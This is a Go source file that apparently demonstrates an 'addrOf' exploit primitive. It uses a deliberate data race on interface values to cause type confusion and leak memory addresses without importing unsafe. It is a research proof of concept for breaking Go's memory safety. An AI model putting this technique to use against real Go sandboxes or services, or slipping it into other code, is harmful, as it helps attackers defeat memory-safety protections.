// race-addrof demonstrates an addrOf primitive using data races
// without using any import, in particular no fmt.Sprintf("%p")
package main

// these imports are only for main() not addrOf
import (
  "fmt"
  "os"
  "runtime"
)

type racerValue interface {
  Value() uint64
}

type holdInterface struct {
  i interface{}
}

func (s holdInterface) Value() uint64 {
  return 0
}

type holdInterfaceAddress struct {
  // an interface is type and pointer to the value
  // line them up the same so we can leak the value
  typ  uint64
  addr uint64
}

func (s holdInterfaceAddress) Value() uint64 {
  return s.addr
}

type holdInterfaceValue struct {
  // an interface is type and pointer to the value
  // line them up the same so we can leak the value
  typ  uint64
  addr *uint64
}

func (s holdInterfaceValue) Value() uint64 {
  if s.addr != nil {
    return *s.addr
  }
  return 0
}

func raceLeak(addr, target racerValue) uint64 {
  confused := target
  dontOptimize := confused
  writes, races := 0, 0
  done := false
  go func() {
    for {
      for i := 0; i < 10000; i++ {
        // a single goroutine flipping confused exploits the race much
        // faster than having two goroutines alternate on the value
        // however, in modern Go versions we need to avoid the smarter
        // compiler removing both statements because they appear useless
        confused = addr
        func() { dontOptimize = confused }()
        confused = target
        writes++
      }
      // exit when we won to avoid leaking a cpu intensive goroutine
      // but the check is too expensive for the race loop so we put it outside
      if done {
        return
      }
    }
  }()
  // we want confused to point to the type of addressHolder
  // but still have the value of interfaceHolder
  for {
    if v := confused.Value(); v > 0 {
      done = true
      fmt.Printf("read race won: races=%v, writes=%v\n", races, writes)
      return v
    }
    races++
  }
  _ = dontOptimize
  return 0
}

func addrOf(x interface{}) uint64 {
  return raceLeak(&holdInterface{x}, &holdInterfaceAddress{})
}

func addrOfValue(x interface{}) uint64 {
  return raceLeak(&holdInterface{x}, &holdInterfaceValue{})
}

func main() {
  if runtime.NumCPU() < 2 {
    fmt.Println("need >= 2 CPUs")
    os.Exit(1)
  }

  fmt.Printf("main: %p == addrof(main) 0x%x\n", main, addrOfValue(main))

  b := []byte("EFGH")
  fmt.Printf("[]byte %p == 0x%x\n", b, addrOfValue(b))

  n := 0xdeadbeef
  fmt.Printf("&uint64: %p == 0x%x\n", &n, addrOf(&n))

  s := "ABCD"
  fmt.Printf("string: %p == 0x%x\n", &s, addrOf(&s))
}
